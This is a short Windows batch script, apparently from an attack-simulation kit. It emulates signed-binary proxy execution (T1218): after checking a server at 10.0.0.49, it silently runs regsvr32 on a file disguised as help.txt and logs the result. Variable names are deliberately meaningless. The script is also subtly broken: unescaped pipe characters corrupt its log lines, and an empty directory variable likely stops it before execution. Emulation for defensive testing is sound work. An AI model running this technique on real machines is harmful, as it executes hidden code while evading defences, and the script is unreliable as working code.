@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?7610-10
SET eykalkg=BALAM-S2B
SET fkesh=10
SET ecrfwq=help.txt
SET rgnpbq=7610

REM Internal variables
SET jkrtpq=0
SET yzxmnv=
SET dtefmt=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2%
SET tmehr=%TIME: =0%
SET tstamp=!dtefmt! !tmehr:~0,2!:!tmehr:~3,2!:!tmehr:~6,2!.!tmehr:~9,3!

REM STEP 1: Check server availability
curl -k -s -o nul "!frytcn!" 2>nul
IF ERRORLEVEL 1 (
    SET jkrtpq=0
    SET yzxmnv=connection_failed
    echo [!tstamp!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=!jkrtpq!:!yzxmnv! >> "%APPDATA%\!fkesh!\macula-simulations.log" 2>nul || rem
    EXIT /B 0
)

REM STEP 2: Navigate to output directory
cd /d "!douyiw!" 2>nul
IF ERRORLEVEL 1 (
    SET jkrtpq=0
    SET yzxmnv=directory_inaccessible
    echo [!tstamp!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=!jkrtpq!:!yzxmnv! >> "%APPDATA%\!fkesh!\macula-simulations.log" 2>nul || rem
    EXIT /B 0
)

REM STEP 3: Execute DLL via regsvr32
SET jkrtpq=1
SET yzxmnv=
C:\Windows\System32\regsvr32.exe /s "!ecrfwq!" 2>nul
IF ERRORLEVEL 1 SET jkrtpq=0&SET yzxmnv=execution_failed

REM Log TTP execution
echo [!tstamp!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=!jkrtpq!:!yzxmnv! >> "%APPDATA%\!fkesh!\macula-simulations.log" 2>nul || rem

ENDLOCAL